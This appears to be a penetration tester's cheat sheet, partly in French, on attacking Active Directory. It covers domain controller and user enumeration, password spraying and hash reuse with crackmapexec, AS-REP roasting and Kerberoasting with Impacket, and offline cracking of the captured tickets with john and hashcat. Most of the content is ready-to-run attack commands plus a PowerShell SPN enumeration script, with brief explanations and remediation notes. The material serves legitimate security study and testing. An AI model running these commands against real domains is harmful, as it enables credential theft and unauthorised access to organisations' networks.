# Enumeration
## DC Enumeration
***Find the Domain Controllers of a domain:***   
`PS> nltest /dclist:<domain>`   
The DC is often the DNS server except for specific cases, can be found with dig, ifconfig, ipconfig, etc.    

## User Enumeration 
***User enumeration through Kerberos port 88:***  
`./kerbrute_linux_amd64 userenum --dc 10.10.11.152 -d <domain> /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`
  
 ***Browse through Active Directory:***   
 `ADExplorer.exe` with Sysinternals installed (not flagged because it is a Microsoft-signed tool)    
 `C:> rundll32 dsquery,OpenQueryWindow`  

## Password spraying (Use/Re-use credentials)  
`crackmapexec winrm 192.168.110.52-56 -u "Administrator" -p "P@ssw0rd"`  
`crackmapexec smb 192.168.110.52-56 -u 'Administrator' -p 'PASSWORD' --local-auth`  
 <br>
 Reuse found hashes on the network :   
   
`crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth`  
`crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'`  
 <br>
# AS_REP Roasting - Blackbox  
  
https://beta.hackndo.com/kerberos-asrep-roasting/
  
  
## Outils :  
·       Rubeus
·       Impacket : GetNPUsers.py
  
## Explication :  
Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification préalable ne soit pas demandée pour certains comptes, permettant à un attaquant d’abuser de cette configuration.
Lorsque nous avons parlé du fonctionnement de Kerberos, il a été mis en évidence que dans le premier échange (KRB_AS_REQ - KRB_AS_REP), le client doit d’abord s’authentifier auprès du KDC avant d’obtenir un TGT. Une partie de la réponse du KDC étant chiffrée avec le secret du compte client (la clé de session), il est important que cette information ne soit pas accessible sans authentification. Dans le cas échéant n’importe qui pourrait demander un TGT pour un compte donné, et tenter de décrypter la partie chiffrée de la réponse KRB_AS_REP pour retrouver le mot de passe de l’utilisateur ciblé.
  

TODO IMG


## Remédiation :  
Ne pas activer “Do not require Kerberos preauthentication”
  
  
À partir de l’adresse <https://beta.hackndo.com/kerberos-asrep-roasting/>
  
## Exécution  
***Récupération des TGT pour les utilisateurs pour lesquels la preauth Kerberos est désactivée :***  
<br>
`PS > python C:\GetNPUsers.py spookysec.local/ -no-pass -usersfile .\userlist2.txt -dc-ip <dc_ip> -outputfile .\ASREP_Roastable_users.txt`
  
***Puis cracking :***  
`PS> john --wordlist=$wordlist ASREP_Roastable_users.txt`
  
(ou : `PS >  .\hashcat.exe --force -m 18200 -a 0 -o "../hash_res.txt" "../svc-admin.txt"`)
  

# Kerberoasting  

## Outils :  
- ListusersSPNs.ps1  
- Impacket GetUserSPNs.py  
  
## Explications :  
Les comptes de service ont un SPN (Service Principal Name), exemple : www/WEB-SERVER-01.adsec.local  
SPN = combinaison du service + de la machine hébergeant le service  
Comptes de service ont généralement un mdp robuste (20-30 caractères)  
Il est possible d'effectuer des demandes de TGS en indiquant des SPN arbitraires  
Un utilisateur de l’AD peut demander un TGS pour n’importe quel service auprès du KDC  
-> Obtention d'un TGS chiffré avec le mdp du compte possédant le SPN  
-> Bruteforce -> si le TGS est déchiffrable, le mot de passe est trouvé  
  
## Remédiation :  
Pas de SPN sur les comptes utilisateurs (ces derniers ont souvent des comptes à mot de passe suivant la politique AD pouvant être bruteforcés), ou alors si VRAIMENT nécessaire, utiliser la fonctionnalité “Managed Service Accounts” (MSA) de Microsoft qui permet de faire en sorte que le mot de passe du compte soit robuste et changé régulièrement et automatiquement  
  
## Exécution  
`ListusersSPNs.ps1`, listing des utilisateurs possédant un SPN :  

`$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")`  
`$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"`     
`$results = $search.Findall()`    
`foreach($result in $results)`    
 &nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$userEntry = $result.GetDirectoryEntry()`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "SPNs"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`foreach($SPN in $userEntry.servicePrincipalName)`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$SPN`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`}`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host ""`  
 &nbsp;&nbsp;&nbsp;`}`      
       
  
À partir de l’adresse <https://beta.hackndo.com/kerberoasting/>
  
  
***Récupération des TGS :***  
<br> 
`C:\Users\Leperche\Desktop\no_scan\impacket-master\examples>python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<domain_username>`  
  
`impacket-GetUserSPNs -target-domain domain.htb -outputfile kerberoastables.txt -dc-ip 192.168.110.50 -request domain.htb/michael`  
  
***Cracking des TGS :***    
  
`
john --format=krb5tgs --wordlist=/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt TGS_to_crack.txt
`
  
***Affichage des TGS crackés :***  
  
`cat ~/.john/john.pot`
  

